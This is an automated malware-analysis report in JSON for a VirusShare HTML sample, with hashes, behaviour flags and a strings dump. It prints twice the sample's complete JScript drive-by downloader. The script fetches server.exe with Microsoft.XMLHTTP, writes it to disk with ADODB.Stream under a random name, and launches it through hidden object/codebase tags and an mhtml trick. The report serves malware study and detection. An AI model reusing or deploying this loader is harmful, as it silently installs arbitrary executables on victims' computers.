{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "ADODB.Stream": "May create a text file",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Microsoft.XMLHTTP": "May download files from the Internet",
            "Open": "May open a file",
            "SaveToFile": "May create a text file",
            "write": "May write to a file"
        },
        "macro": "<html>\n<body>\n<DIV id=\"ObjectContainer\"></DIV>\n<IFRAME name=\"icounter\" width=60 height=30 style=\"display:none\"></IFRAME>\n<SCRIPT LANGUAGE=\"JScript\">   \n   \n   \n   function LaunchExecutable9X(InetPath)\n   {\n     tagstyle='style=\"display:none\"'; \n     ObjCLSID=\"clsid:10000000-1000-0000-10000-000000000001\";\n     ObjBASE='mhtml:file://C:\\\\ARCHIVE.MHT!'+InetPath;\n     sObject ='<object classid=\"'+ObjCLSID+'\" codebase=\"'+ObjBASE+'\" '+tagstyle+'></object>';\n     icounter.document.write(sObject);\n     setTimeout('icounter.document.execCommand(\"Refresh\")',1000);\n \n   }\n   \n  function LaunchExecutable2K(ObjSrc)\n   {\n     tagstyle='style=\"display:none\"'; \n     ObjCLSID=\"clsid:10000000-1000-0000-10000-000000000001\";\n     sObject ='<object classid=\"'+ObjCLSID+'\" codebase=\"'+ObjSrc+'\" '+tagstyle+'></object>';\n     try\n     {\n         ObjectContainer.innerHTML=sObject;\n     }\n     catch(e){}  \n   }\n\n   ObjSrc=\"\";\n   \n   for (ik=0;ik<8;ik++)\n   {\n       ii=Math.random();\n       chCode=Math.round(ii*25)+0x61;\n       chSym=String.fromCharCode(chCode);\n       ObjSrc=ObjSrc+chSym;\n       if (chCode==0x61) {break};\n   }\n\n   ObjSrc=\"C:\\\\Program Files\\\\Internet Explorer\\\\\"+ObjSrc+\".exe\";\n \n   var InetPath=document.location.href;\n   iPrefix=InetPath.substring(0,7);\n  \n   switch(iPrefix)\n   {\n   case \"http://\" :\n                   j=InetPath.lastIndexOf('/');\n                   InetPath=InetPath.slice(0,j)+'/server.exe';\n                   break; \n   case \"ms-its:\" :\n                   i=InetPath.indexOf('!');\n                   j=InetPath.lastIndexOf('//'); \n                   InetPath=InetPath.slice(i+1,j)+'/server.exe';\n                   break;\n   }\n \n  \n   \n   {\n   var oXMLHTTP = new ActiveXObject(\"Microsoft.XMLHTTP\"); \n   oXMLHTTP.Open(\"GET\",InetPath,0); \n   oXMLHTTP.Send();   \n\n   try\n   {\n      var oStream = new ActiveXObject('ADODB.Stream'); \n      oStream.Mode = 3; \n      oStream.Type = 1; \n      oStream.Open(); \n      oStream.Write(oXMLHTTP.responseBody); \n      oStream.SaveToFile(ObjSrc,2);\n   }\n   catch(e){}\n\n   setTimeout(\"LaunchExecutable2K(ObjSrc)\",1000);\n   }\n\n \n   {\n      LaunchExecutable9X(InetPath);\n   }\n\n</script language=\"JScript\"> \n</body>\n</html><br>"
    },
    "filename": "VirusShare_21c7bc737679181b810d6e72aa6b81cf",
    "filesize": 2274,
    "filetype": "HTML document, ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "21c7bc737679181b810d6e72aa6b81cf",
        "sha1": "82adbb7ea956a120049a7fa84eb615ec1d1f6728",
        "sha256": "4493d2b1c151e262bd3ecc9d888c1c13c4450126a435ba152a59aa10b886308d"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "<html>",
            "<body>",
            "<DIV id=\"ObjectContainer\"></DIV>",
            "<IFRAME name=\"icounter\" width=60 height=30 style=\"display:none\"></IFRAME>",
            "<SCRIPT LANGUAGE=\"JScript\">   ",
            "   function LaunchExecutable9X(InetPath)",
            "   {",
            "     tagstyle='style=\"display:none\"'; ",
            "     ObjCLSID=\"clsid:10000000-1000-0000-10000-000000000001\";",
            "     ObjBASE='mhtml:file://C:\\\\ARCHIVE.MHT!'+InetPath;",
            "     sObject ='<object classid=\"'+ObjCLSID+'\" codebase=\"'+ObjBASE+'\" '+tagstyle+'></object>';",
            "     icounter.document.write(sObject);",
            "     setTimeout('icounter.document.execCommand(\"Refresh\")',1000);",
            "   }",
            "  function LaunchExecutable2K(ObjSrc)",
            "   {",
            "     tagstyle='style=\"display:none\"'; ",
            "     ObjCLSID=\"clsid:10000000-1000-0000-10000-000000000001\";",
            "     sObject ='<object classid=\"'+ObjCLSID+'\" codebase=\"'+ObjSrc+'\" '+tagstyle+'></object>';",
            "     try",
            "     {",
            "         ObjectContainer.innerHTML=sObject;",
            "     }",
            "     catch(e){}  ",
            "   }",
            "   ObjSrc=\"\";",
            "   for (ik=0;ik<8;ik++)",
            "   {",
            "       ii=Math.random();",
            "       chCode=Math.round(ii*25)+0x61;",
            "       chSym=String.fromCharCode(chCode);",
            "       ObjSrc=ObjSrc+chSym;",
            "       if (chCode==0x61) {break};",
            "   }",
            "   ObjSrc=\"C:\\\\Program Files\\\\Internet Explorer\\\\\"+ObjSrc+\".exe\";",
            "   var InetPath=document.location.href;",
            "   iPrefix=InetPath.substring(0,7);",
            "   switch(iPrefix)",
            "   {",
            "   case \"http://\" :",
            "                   j=InetPath.lastIndexOf('/');",
            "                   InetPath=InetPath.slice(0,j)+'/server.exe';",
            "                   break; ",
            "   case \"ms-its:\" :",
            "                   i=InetPath.indexOf('!');",
            "                   j=InetPath.lastIndexOf('//'); ",
            "                   InetPath=InetPath.slice(i+1,j)+'/server.exe';",
            "                   break;",
            "   }",
            "   {",
            "   var oXMLHTTP = new ActiveXObject(\"Microsoft.XMLHTTP\"); ",
            "   oXMLHTTP.Open(\"GET\",InetPath,0); ",
            "   oXMLHTTP.Send();   ",
            "   try",
            "   {",
            "      var oStream = new ActiveXObject('ADODB.Stream'); ",
            "      oStream.Mode = 3; ",
            "      oStream.Type = 1; ",
            "      oStream.Open(); ",
            "      oStream.Write(oXMLHTTP.responseBody); ",
            "      oStream.SaveToFile(ObjSrc,2);",
            "   }",
            "   catch(e){}",
            "   setTimeout(\"LaunchExecutable2K(ObjSrc)\",1000);",
            "   }",
            "   {",
            "      LaunchExecutable9X(InetPath);",
            "   }",
            "</script language=\"JScript\"> ",
            "</body>",
            "</html><br>"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://",
            "file://C:\\\\ARCHIVE.MHT"
        ]
    },
    "time": "0:00:00.283431",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
